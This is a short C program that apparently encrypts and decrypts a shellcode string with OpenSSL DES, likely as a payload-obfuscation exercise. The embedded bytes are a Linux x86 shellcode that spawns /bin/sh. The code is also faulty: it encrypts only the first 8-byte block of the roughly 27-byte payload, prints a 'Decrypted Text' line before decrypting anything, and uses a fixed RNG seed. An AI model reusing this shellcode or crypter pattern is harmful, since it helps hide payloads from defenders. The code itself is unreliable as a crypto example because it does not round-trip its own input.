#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <openssl/des.h>
#include <openssl/rand.h>
 
#define BUFSIZE 200 
 
int main(void)
{
    unsigned char in[BUFSIZE], out[BUFSIZE], back[BUFSIZE];
    unsigned char *e = out;
    DES_cblock key;
    DES_cblock seed = {0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32, 0x10};
    DES_key_schedule keysched;
 
    memset(in, 0, sizeof(in));
    memset(out, 0, sizeof(out));
    memset(back, 0, sizeof(back));
 
    RAND_seed(seed, sizeof(DES_cblock));
 
    DES_random_key(&key);
 
    DES_set_key((C_Block *)key, &keysched);
 
    /* 8 bytes of plaintext */
    strcpy(in, "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80");
 
    printf("Plaintext: [%s]\n", in);
int i;
for(i=0;i<strlen(in);i++){
	printf("\\x%02x",in[i]);
}
printf("\n");

 
    DES_ecb_encrypt((C_Block *)in,(C_Block *)out, &keysched, DES_ENCRYPT);
 
    printf("Ciphertext:");
    while (*e) printf(" [%02x]", *e++);
    printf("\n");
 printf("Decrypted Text: [%s]\n", back);
for(i=0;i<strlen(out);i++){
        printf("\\x%02x",out[i]);
}

 
    DES_ecb_encrypt((C_Block *)out,(C_Block *)back, &keysched, DES_DECRYPT);
 
    printf("Decrypted Text: [%s]\n", back);
for(i=0;i<strlen(back);i++){
        printf("\\x%02x",back[i]);
}
 
    return(0);
}


